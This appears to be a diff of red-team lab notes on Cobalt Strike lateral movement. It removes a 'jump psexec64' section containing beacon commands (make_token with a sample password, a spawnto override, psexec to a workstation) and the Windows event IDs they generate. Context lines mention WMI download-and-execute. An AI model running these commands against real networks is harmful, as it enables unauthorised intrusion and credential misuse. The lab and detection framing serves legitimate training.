@@ -801,33 +801,9 @@ beacon back via SMB. You need the payload already on the target (uploaded separa
 use a PowerShell one-liner via WMI to download and execute. WMI execution is logged via
 Event ID 4688 (process creation) and WMI activity log — less noisy than a service but not silent.
 
----
+> `jump psexec64` (OPSEC-🔴UNSAFE — last resort only)  
 
-#### Option 4 — `jump psexec64` (OPSEC-🔴UNSAFE — last resort only)
-
-Only use if WinRM is disabled, SCShell fails, and WMI is blocked.
-
-```cs
-beacon> make_token CONTOSO\rsteel Passw0rd!
-
-// REQUIRED: override spawnto for service payload BEFORE running psexec
-// post-ex spawnto_x64 env vars do NOT resolve in SYSTEM service context
-beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
-
-beacon> jump psexec64 lon-ws-1 smb
-```
-
-> `ak-settings` only affects the Artifact Kit service payload spawnto. It does not affect
-> the `post-ex.spawnto_x64` profile setting. These are separate controls.
-
-**What this generates — understand before using:**
-- Event 7045 on target (new service installed) → explicit OPSEC deduction
-- Event 4697 (security log) — service installed
-- Network authentication events (4624/4672)
-- File write of the service binary to `ADMIN$` share
-- Service creation + immediate deletion pair (7045 + service stop events)
-
-<img src="/images/defence-evasion-lab-07.png" width=1024>
+<img src="/images/defence-evasion-lab-07.png" width=860>
 
 ---
 
